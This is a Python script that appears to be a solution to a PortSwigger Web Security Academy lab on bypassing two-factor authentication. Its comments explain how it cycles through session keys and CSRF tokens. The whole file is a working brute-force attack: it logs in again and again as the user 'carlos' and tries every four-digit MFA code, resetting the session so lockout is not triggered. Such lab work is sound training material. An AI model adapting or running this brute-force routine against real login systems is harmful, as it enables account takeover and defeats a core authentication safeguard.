import requests
from requests_toolbelt.utils import dump
import sys
import os
import re

'''
!!!sometimes it might be nessecary to run script a few times!!!

brief explanation:
to use this script you need to input url and 1st session key,

after that stript sends get request for login and we get 1st csrf token
after that in loop we iterate through all 2fa codes

we send post request with victim credentials 1st session key and 1st csrf token
server in responce sends us 2nd sesion key for login 2
then we send get request for login 2 which gives us 2nd csrf token for login 2

now we send post request with 2nd csrf token and 2nd session key
if token didnt change we send another one

after two failed attempts(can be one if token changed) server sends us csrf token and session key for /login
with these two we can go back to the begening to the loop
'''

def get_csrf(response):
    pattern = r'<input required type="hidden" name="csrf" value="([A-Za-z0-9]+)">'
    match = re.search(pattern, response)
    if match:
        return match.group(1)
    else:
        print(response)
        raise ValueError("CSRF token not found.")
    
def get_session_key(response):
    pattern = r'session=([A-Za-z0-9]+);'
    match = re.search(pattern, response)
    if match:
        return match.group(1)
    else:
        raise ValueError("Session ID not found.")

url = '0afb00c7034cf2828127a21a005100c2.web-security-academy.net'
session_key = '5T7spbW6sJm3jtiX9QiNqbnJtjEpj9JB'
path= '/login'

HEADERS = {'Host': url,
            'Cookie':'session='+session_key,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url+path,
            'Origin': url,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin'} 


def logging_hook(response, *args, **kwargs):
    data = dump.dump_all(response)
    print(data.decode('utf-8'))

http = requests.Session()
# http.hooks["response"] = [logging_hook]

username = 'carlos'
password =  'montoya'


# we get 1st csrf key
r1 = http.get('https://'+url+'/login', headers=HEADERS, allow_redirects=False)
csrf_token = get_csrf(dump.dump_all(r1).decode('utf-8'))


code = 0
while code < 10000:
    sys.stdout.write('\r'+'trying: '+str(code))
    sys.stdout.flush()

    # we get 2nd session key
    r2 = http.post('https://'+url+'/login', headers=HEADERS, data='csrf='+csrf_token+'&username='+username+'&password='+password, allow_redirects=False)
    session_key = get_session_key(dump.dump_all(r2).decode('utf-8'))
    HEADERS['Cookie'] = 'session='+session_key

    # we get 2nd csrf token
    r3 = http.get('https://'+url+'/login2', headers=HEADERS, allow_redirects=False)
    csrf_token_2 = get_csrf(dump.dump_all(r3).decode('utf-8'))

    # we check if this iterations 2fa code is correct
    r4 = http.post('https://'+url+'/login2', headers=HEADERS, data='csrf='+csrf_token_2+'&mfa-code='+str('{0:04}'.format(code)), allow_redirects=False)

    # if is correct we print session key and access this page so that lab is solved
    if r4.status_code == 302:
        print('\n2fa code is: '+str(code))
        session_key = get_session_key(dump.dump_all(r4).decode('utf-8'))
        print('session key:'+session_key)
        HEADERS['Cookie'] = 'session='+session_key
        http.get('https://'+url+'/my-account', headers=HEADERS, allow_redirects=False)
        break

    if get_csrf(dump.dump_all(r4).decode('utf-8')) == csrf_token_2 and r4.status_code != 302:
        code += 1
        r4 = http.post('https://'+url+'/login2', headers=HEADERS, data='csrf='+csrf_token_2+'&mfa-code='+str('{0:04}'.format(code)), allow_redirects=False)

    # preparation for another iteration
    session_key = get_session_key(dump.dump_all(r4).decode('utf-8'))
    csrf_token = get_csrf(dump.dump_all(r4).decode('utf-8'))
    HEADERS['Cookie'] = 'session='+session_key

    # if is correct we print session key and access this page so that lab is solved
    if r4.status_code == 302:
        print('\n2fa code is: '+str(code))
        session_key = get_session_key(dump.dump_all(r4).decode('utf-8'))
        print('session key:'+session_key)
        HEADERS['Cookie'] = 'session='+session_key
        http.get('https://'+url+'/my-account', headers=HEADERS, allow_redirects=False)
        break
    code += 1